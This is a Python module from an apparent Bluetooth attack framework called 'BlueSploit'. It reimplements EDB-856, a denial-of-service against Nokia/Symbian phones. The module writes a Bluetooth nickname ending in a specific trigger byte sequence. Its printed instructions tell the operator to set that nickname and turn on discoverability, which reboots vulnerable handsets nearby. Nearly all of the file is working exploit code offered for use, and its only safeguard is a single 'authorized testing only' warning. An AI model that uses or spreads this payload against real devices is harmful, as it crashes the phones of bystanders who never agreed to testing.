"""
BlueSploit Module: Nokia Bluetab Nickname Crash
EDB-ID: 856  (Qnix, 2005)

Generates `bluetab.txt` containing a Bluetooth nickname terminated by
the byte sequence  0x09 0x2E 0x0A.  Setting this string as a Symbian /
Java handset's Bluetooth nickname causes nearby devices that discover
it to reboot.

This module only writes the file — operator copies the nickname onto
their handset and triggers the bug by being discoverable.
"""

import os
from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors,
)


_TRAILER = bytes([0x09, 0x2E, 0x0A])


class Module(DosModule):
    info = ModuleInfo(
        name="dos/nokia_bluetab_nickname",
        description="Nokia/Symbian Bluetooth nickname crash file generator (EDB-856)",
        author=["Qnix"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.LOW,
        references=["https://www.exploit-db.com/exploits/856"],
    )

    def _setup_options(self) -> None:
        self.options = {
            "nickname": ModuleOption(
                name="nickname", required=True,
                description="Nickname string to wrap with the trigger trailer",
            ),
            "output_file": ModuleOption(
                name="output_file", required=False, default="bluetab.txt",
                description="Output file path",
            ),
        }

    def run(self) -> bool:
        nick = self.get_option("nickname")
        out  = self.get_option("output_file") or "bluetab.txt"

        if not nick:
            print_error("nickname is required")
            return False

        C = Colors
        print(f"\n  {C.RED}{'─'*55}{C.RESET}")
        print(f"  {C.BOLD}Nokia Bluetab Nickname Generator (EDB-856){C.RESET}")
        print(f"  {C.RED}{'─'*55}{C.RESET}")
        print_info(f"Nickname : {nick}")
        print_info(f"Output   : {out}")
        print_warning("Authorized testing only — vulnerable phones reboot on discovery")

        try:
            with open(out, "wb") as f:
                f.write(nick.encode("utf-8") + _TRAILER)
            sz = os.path.getsize(out)
            print_success(f"Wrote {sz} bytes to {out}")
            print_info("Copy the contents into your phone's Bluetooth nickname,")
            print_info("then make the device discoverable to trigger nearby targets.")
            self.add_result({"edb_id": 856, "file": out, "bytes": sz})
            return True
        except Exception as e:
            print_error(f"Write failed: {e}")
            return False
